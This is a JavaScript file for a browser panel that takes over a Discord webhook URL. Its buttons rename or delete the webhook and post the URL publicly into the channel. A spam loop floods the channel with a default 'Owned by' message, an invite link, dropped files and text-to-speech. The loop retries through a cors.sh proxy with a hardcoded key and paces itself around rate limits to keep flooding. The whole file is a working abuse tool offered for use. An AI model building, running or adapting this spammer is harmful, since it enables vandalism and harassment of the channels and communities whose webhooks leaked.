addEventListener("load", () => {
    const main = document.querySelector("body > main");

    /** @param {TemplateStringsArray} text */
    function html(text, ...placeholders) {
        let output = '';
        let i = 0;
        for (let el of text) {
            if (i > 0)
                output += placeholders.shift().toString()
                    .replace("&", "&amp;")
                    .replace('"', "&quot;")
                    .replace('<', '&lt;')
                    .replace('>', '&gt;');

            output += el;
            i++;
        }
        return output;
    }

    class Screens {
        static login() {
            main.innerHTML = html`<div id="login">
                <h3>Webhook URL</h3>
                <input type="url" placeholder="the goofy ahh url">
                <p class="state"></p>
                <button>Log in</button>
            </div>`;

            let input = main.querySelector("input");
            let state = main.querySelector(".state");

            main.querySelector("button").addEventListener("click", () => {
                let url = input.value;
                if (!/https:\/\/discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/.test(url)) {
                    state.textContent = "Invalid URL!";
                    return;
                }

                Screens.panel(url).catch(() => {
                    state.textContent = "Unknown webhook!";
                });
            });
        }

        static async panel(url) {
            let resp = await (await fetch(url)).json();
            main.querySelector("#login").classList.add("hide");
            await new Promise(rsv => setTimeout(rsv, 450));
            main.innerHTML = html`<div id="panel">
                <div class="flex">
                    <div class="user">
                        <img src="${resp.avatar ? `https://cdn.discordapp.com/avatars/${resp.id}/${resp.avatar}.webp?size=32` : 'https://cdn.discordapp.com/role-icons/1315037229575573655/3e03c08d6163ef34a15663c65f2b7fc2.webp?size=32&quality=lossless'}" width="20" height="20">
                        <p class="username" style="-webkit-user-modify: read-write-plaintext-only">${resp.name}</p>
                    </div>
                    <div class="leak btn">
                        <i class="fas fa-poo-storm"></i>
                    </div>
                    <div class="remove btn">
                        <i class="fas fa-ban"></i>
                    </div>
                </div>
                <div class="spammer">
                    <textarea class="message">${'Owned by Olafcio x Uncover It\n'.repeat(50)}Have Ur "Revenge" -> https://discord.gg/7rDreSNetN</textarea>
                    <div class="flex">
                        <button class="toggle-spam"><i class="far fa-play"></i> Start spam</button>
                        <button class="tts-toggle"><i class="far fa-headset"></i> TTS</button>
                    </div>
                </div>
            </div>`;
            let corssh = localStorage.getItem("corsSh");
            if (!corssh)
                if (corssh = prompt("cors.sh api key", "temp_90675fd335e938dd4f1c06ea17a8f9e2"))
                    localStorage.setItem("corsSh", corssh);
            if (corssh)
                alert("Proxy key applied.");
            let username = main.querySelector(".username");
            async function applyunchange() {
                await fetch(url, {
                    method: "PATCH",
                    body: JSON.stringify({
                        name: username.innerText
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                alert("Username changed.");
            }
            username.addEventListener("keyup", ev => {
                if (ev.key === "Enter") {
                    ev.preventDefault();
                    applyunchange();
                }
            });
            username.addEventListener("focusout", applyunchange);
            let deletebtn = main.querySelector(".remove");
            deletebtn.addEventListener("click", async () => {
                try {
                    await fetch(url, { method: "DELETE" });
                } catch {
                    try {
                        await fetch("https://proxy.cors.sh/" + url, { method: "DELETE" });
                    } catch {
                        alert("Couldn't delete the webhook — fetch failed");
                        return;
                    }
                }

                alert("Webhook deleted.");
            });
            let leakbtn = main.querySelector(".leak");
            leakbtn.addEventListener("click", async () => {
                let data;
                await fetch(url, data = {
                    method: "POST",
                    body: JSON.stringify({
                        content: url,
                        tts: true
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                await fetch("https://proxy.cors.sh/" + url, data);
                alert("URL sent.");
            });
            let togglebtn = main.querySelector(".toggle-spam");
            let ttsbtn = main.querySelector(".tts-toggle");
            let message = main.querySelector(".message");
            let spamActive = false;
            let isTTS = false;
            let justdidmore = -1;
            let row429 = 0;
            let did = 0;
            let content, tts;
            let images = [];
            message.addEventListener("dragover", ev => {
                ev.preventDefault();
            });
            message.addEventListener("drop", ev => {
                ev.preventDefault();

                images.push(...ev.dataTransfer.files);
            });
            async function startSpam() {
                if (!spamActive)
                    return;
                let resps = [];
                let form = new FormData();
                for (let i = 0; i < images.length; i++)
                    form.append(`file`, images[i]);
                form.append("payload_json", JSON.stringify({
                    content,
                    tts
                }));
                let data = {
                    method: "POST",
                    body: form
                };
                let now = performance.now();
                let diff = now - justdidmore;
                if (diff >= 6000) {
                    let no = false;

                    if (did < 6) {
                    } else if (did >= 15) {
                        did = 0;
                    } else no = true;

                    if (!no) {
                        var length = 2;
                        justdidmore = now;
                    }
                } else var length = 1;
                for (let i = 0; i < length; i++)
                    resps.push(fetch(url, data));
                for (let i = 0; i < length; i++)
                    resps.push(fetch("https://proxy.cors.sh/" + url, {
                        ...data,
                        "mode": "cors",
                        "credentials": "omit",
                        "headers": {
                            ...data.headers,
                            "x-cors-api-key": corssh
                        }
                    }));
                resps = await Promise.all(resps);
                let timeout;
                if (timeout = resps.find(data => data.status === 429 && data.body)) {
                    alert("Hit rate limit, slowing down.");
                    await new Promise(rsv => setTimeout(rsv, (JSON.parse(data.body).retry_after * 1000) + 750*row429));
                    row429++;
                } else if (timeout = resps.find(data => data.status === 429)) {
                    await new Promise(rsv => setTimeout(rsv, 2000));
                    row429++;
                } else if (resps.some(data => data.status === 404)) {
                    spamActive = false;
                    togglebtn.innerHTML = `<i class="far fa-play"></i> Start spam`;
                    alert("Webhook got deleted by someone else.");
                    return;
                } else {
                    row429 = 0;
                    await new Promise(rsv => setTimeout(rsv, 1000));
                }
                did++;
                setTimeout(startSpam);
            }
            togglebtn.addEventListener("click", () => {
                if (spamActive) {
                    spamActive = false;
                    togglebtn.innerHTML = `<i class="far fa-play"></i> Start spam`;
                    alert("Spam stopped.");
                } else {
                    spamActive = true;
                    togglebtn.innerHTML = `<i class="far fa-stop"></i> Stop spam`;
                    justdidmore = -1;
                    row429 = 0;
                    did = 0;
                    content = message.value;
                    tts = isTTS;
                    startSpam();
                    alert("Spam started.");
                }
            });
            ttsbtn.addEventListener("click", () => {
                isTTS = !isTTS;
                ttsbtn.classList.toggle("toggled", isTTS);
            });
        }
    }

    function alert(message) {
        let el = document.createElement("div");
        el.className = "alert";
        el.innerText = message;
        document.body.append(el);
        setTimeout(() => el.remove(), 1350);
    }

    Screens.login();
}, { once: true });
